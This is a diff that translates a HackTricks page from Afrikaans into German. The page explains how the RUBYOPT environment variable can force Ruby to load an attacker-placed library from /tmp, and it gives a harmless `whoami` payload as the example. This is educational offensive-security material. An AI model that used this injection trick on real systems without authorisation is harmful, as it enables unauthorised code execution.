@@ -17,9 +17,9 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## RUBYOPT
 
-Deur hierdie omgewing veranderlike te gebruik, is dit moontlik om **nuwe parameters** by **ruby** te voeg wanneer dit uitgevoer word. Alhoewel die parameter **`-e`** nie gebruik kan word om ruby kode aan te dui om uit te voer nie, is dit moontlik om die parameters **`-I`** en **`-r`** te gebruik om 'n nuwe gids by die biblioteke laai pad te voeg en dan **'n biblioteek aan te dui om te laai**.
+Mit dieser Umgebungsvariable ist es möglich, **neue Parameter** zu **ruby** hinzuzufügen, wann immer es ausgeführt wird. Obwohl der Parameter **`-e`** nicht verwendet werden kann, um Ruby-Code anzugeben, der ausgeführt werden soll, ist es möglich, die Parameter **`-I`** und **`-r`** zu verwenden, um einen neuen Ordner zum Bibliotheksladepfad hinzuzufügen und dann **eine Bibliothek zum Laden anzugeben**.
 
-Skep die biblioteek **`inject.rb`** in **`/tmp`**:
+Erstellen Sie die Bibliothek **`inject.rb`** in **`/tmp`**:
 
 {% code title="inject.rb" %}
 ```ruby
@@ -27,7 +27,7 @@ puts `whoami`
 ```
 {% endcode %}
 
-Skep enige plek 'n ruby-skrip soos:
+Erstellen Sie irgendwo ein Ruby-Skript wie:
 
 {% code title="hello.rb" %}
 ```ruby
@@ -35,25 +35,25 @@ puts 'Hello, World!'
 ```
 {% endcode %}
 
-Laastens maak 'n arbitrêre ruby-skrip dit laai met:
+Dann lassen Sie ein beliebiges Ruby-Skript es mit folgendem laden:
 ```bash
 RUBYOPT="-I/tmp -rinject" ruby hello.rb
 ```
-Fun fact, dit werk selfs met die param **`--disable-rubyopt`**:
+Fun Fact, es funktioniert sogar mit dem Parameter **`--disable-rubyopt`**:
 ```bash
 RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
 ```
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
